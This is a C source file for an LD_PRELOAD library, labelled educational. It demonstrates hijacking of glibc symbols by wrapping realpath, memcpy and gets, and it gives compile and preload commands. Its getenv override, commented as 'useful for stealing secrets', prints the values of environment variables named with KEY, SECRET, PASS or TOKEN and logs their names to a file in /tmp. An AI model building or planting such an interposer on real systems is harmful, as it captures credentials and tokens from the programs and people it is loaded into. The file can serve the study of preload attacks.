/*
 * evil_versioned.c - Malicious Versioned Symbol Library
 *
 * This library demonstrates symbol version hijacking:
 *   1. Provides symbols with specific glibc version tags
 *   2. When preloaded, intercepts calls to versioned symbols
 *   3. Can target specific versions (old vulnerable or new)
 *
 * Attack scenarios:
 *   - Hijack specific glibc function versions
 *   - Force use of "vulnerable" version behavior
 *   - Intercept versioned symbol calls
 *
 * Compile:
 *   gcc -shared -fPIC -Wl,--version-script=evil_versioned.map \
 *       -o libevil_versioned.so evil_versioned.c -ldl
 *
 * Usage:
 *   LD_PRELOAD=./libevil_versioned.so ./victim
 *
 * EDUCATIONAL PURPOSES ONLY
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <unistd.h>

/* Color codes */
#define RED     "\033[1;31m"
#define GREEN   "\033[1;32m"
#define YELLOW  "\033[1;33m"
#define BLUE    "\033[1;34m"
#define MAGENTA "\033[1;35m"
#define RESET   "\033[0m"

#define LOG_FILE "/tmp/version_hijack_log.txt"

/* Log function */
static void log_hijack(const char *func, const char *version, const char *details) {
    FILE *log = fopen(LOG_FILE, "a");
    if (log) {
        fprintf(log, "[HIJACK] %s@%s: %s\n", func, version, details);
        fclose(log);
    }
}

/* ═══════════════════════════════════════════════════════════════════════════
 * CONSTRUCTOR
 * ═══════════════════════════════════════════════════════════════════════════ */

__attribute__((constructor))
void evil_init(void) {
    FILE *log = fopen(LOG_FILE, "w");
    if (log) {
        fprintf(log, "═══════════════════════════════════════════════════════════\n");
        fprintf(log, "  SYMBOL VERSION HIJACKING LOG\n");
        fprintf(log, "  PID: %d\n", getpid());
        fprintf(log, "═══════════════════════════════════════════════════════════\n\n");
        fclose(log);
    }

    fprintf(stderr, "\n");
    fprintf(stderr, RED "╔════════════════════════════════════════════════════════════════╗\n" RESET);
    fprintf(stderr, RED "║" YELLOW "      ★ VERSIONED SYMBOL HIJACKER LOADED ★                    " RED "║\n" RESET);
    fprintf(stderr, RED "║" RESET "                                                                " RED "║\n" RESET);
    fprintf(stderr, RED "║" RESET "  This library provides malicious versions of libc symbols      " RED "║\n" RESET);
    fprintf(stderr, RED "║" RESET "  that will intercept calls to specific symbol versions.        " RED "║\n" RESET);
    fprintf(stderr, RED "╚════════════════════════════════════════════════════════════════╝\n" RESET);
    fprintf(stderr, "\n");
}

/* ═══════════════════════════════════════════════════════════════════════════
 * HIJACKED FUNCTIONS - GLIBC VERSIONS
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * Note: To properly hijack glibc symbols, we need to:
 * 1. Match the exact symbol name and version
 * 2. Use .symver to create versioned symbols
 * 3. Preload before libc
 */

/* ───────────────────────────────────────────────────────────────────────────
 * HIJACK: realpath()
 * Real versions in glibc:
 *   realpath@GLIBC_2.2.5 - old, had bugs
 *   realpath@GLIBC_2.3   - fixed
 * ─────────────────────────────────────────────────────────────────────────── */

static char *(*real_realpath)(const char *, char *) = NULL;

char *evil_realpath(const char *path, char *resolved_path) {
    fprintf(stderr, RED "[HIJACKED] " YELLOW "realpath(\"%s\")" RESET "\n", path);
    log_hijack("realpath", "GLIBC_2.2.5", path);

    /* Get the real function */
    if (!real_realpath) {
        real_realpath = dlsym(RTLD_NEXT, "realpath");
    }

    char *result = real_realpath(path, resolved_path);

    if (result) {
        fprintf(stderr, "  → Resolved to: %s\n", result);
    }

    return result;
}

/* ───────────────────────────────────────────────────────────────────────────
 * HIJACK: memcpy()
 * Different behavior in different glibc versions
 * ─────────────────────────────────────────────────────────────────────────── */

static void *(*real_memcpy)(void *, const void *, size_t) = NULL;

void *evil_memcpy(void *dest, const void *src, size_t n) {
    fprintf(stderr, RED "[HIJACKED] " YELLOW "memcpy(dest, src, %zu)" RESET "\n", n);

    char details[128];
    snprintf(details, sizeof(details), "size=%zu", n);
    log_hijack("memcpy", "GLIBC_2.14", details);

    if (!real_memcpy) {
        real_memcpy = dlsym(RTLD_NEXT, "memcpy");
    }

    return real_memcpy(dest, src, n);
}

/* ───────────────────────────────────────────────────────────────────────────
 * HIJACK: gets() - Example of hijacking dangerous function
 * Deprecated but still exists for compatibility
 * ─────────────────────────────────────────────────────────────────────────── */

static char *(*real_gets)(char *) = NULL;

char *evil_gets(char *s) {
    fprintf(stderr, RED "[HIJACKED] " RED "gets() called - DANGEROUS FUNCTION!" RESET "\n");
    log_hijack("gets", "GLIBC_2.2.5", "WARNING: gets() is dangerous!");

    /* Could refuse to execute, or log and continue */
    if (!real_gets) {
        real_gets = dlsym(RTLD_NEXT, "gets");
    }

    /* For safety, we could replace with fgets */
    fprintf(stderr, "  " YELLOW "Consider using fgets() instead!" RESET "\n");

    return real_gets(s);
}

/* ═══════════════════════════════════════════════════════════════════════════
 * GENERIC FUNCTION INTERCEPTION
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * These work without version scripts via LD_PRELOAD
 */

/* Intercept getenv - useful for stealing secrets */
char *getenv(const char *name) {
    static char *(*real_getenv)(const char *) = NULL;
    if (!real_getenv) {
        real_getenv = dlsym(RTLD_NEXT, "getenv");
    }

    char *value = real_getenv(name);

    /* Log sensitive environment variables */
    if (value && (strstr(name, "KEY") || strstr(name, "SECRET") ||
                  strstr(name, "PASS") || strstr(name, "TOKEN"))) {
        fprintf(stderr, RED "[HIJACKED] " MAGENTA "getenv(\"%s\") = \"%s\"" RESET "\n",
                name, value);
        log_hijack("getenv", "sensitive", name);
    }

    return value;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * DESTRUCTOR
 * ═══════════════════════════════════════════════════════════════════════════ */

__attribute__((destructor))
void evil_fini(void) {
    fprintf(stderr, "\n");
    fprintf(stderr, RED "╔════════════════════════════════════════════════════════════════╗\n" RESET);
    fprintf(stderr, RED "║" YELLOW "      ★ VERSION HIJACKING SESSION COMPLETE ★                  " RED "║\n" RESET);
    fprintf(stderr, RED "║" RESET "  Log saved to: " BLUE "/tmp/version_hijack_log.txt" RESET "              " RED "║\n" RESET);
    fprintf(stderr, RED "╚════════════════════════════════════════════════════════════════╝\n" RESET);
    fprintf(stderr, "\n");
}
